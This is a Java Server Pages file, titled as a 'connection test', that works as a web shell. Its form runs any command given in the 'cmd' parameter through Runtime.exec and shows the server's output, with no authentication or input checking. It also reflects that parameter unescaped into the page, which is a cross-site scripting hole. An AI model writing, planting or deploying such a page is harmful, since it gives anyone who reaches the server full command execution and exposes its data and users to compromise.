<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"
    import="java.io.*, java.net.*"
    %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Teste de conexão</title>
</head>
<body>

<form method="get" action="testCmd.jsp">
	Comando:<input type="text" name="cmd" size="200" value="<%=request.getParameter("cmd")==null?"":request.getParameter("cmd")%>">
	<input type="submit" name="testa" value="Executa">
	<input type="reset" name="reset">
</form>

<% 
if(request.getParameter("cmd") != null){
	String cmd = request.getParameter("cmd");
	Runtime rt = Runtime.getRuntime();
	Process ps = rt.exec(cmd);
	//int retorno = ps.waitFor();
%>
	Retorno do processo : <br>
	Stdin:<br>
	<hr>
	<code>
<%	
	BufferedReader reader = new BufferedReader(new InputStreamReader(ps.getInputStream()));
	String c=null;
	while( (c= reader.readLine()) != null){
		out.println(c);out.println("<br>");
	}
	reader.close();
		
%>
	</code>
	<br/>
	Stderr:<br>
	<hr>
<%	
	reader = new BufferedReader(new InputStreamReader(ps.getErrorStream()));

	c = null;
	while( (c= reader.readLine()) != null){
		out.println(c);out.println("<br>");
	}
	reader.close();
		
}	

%>
	

</body>
</html>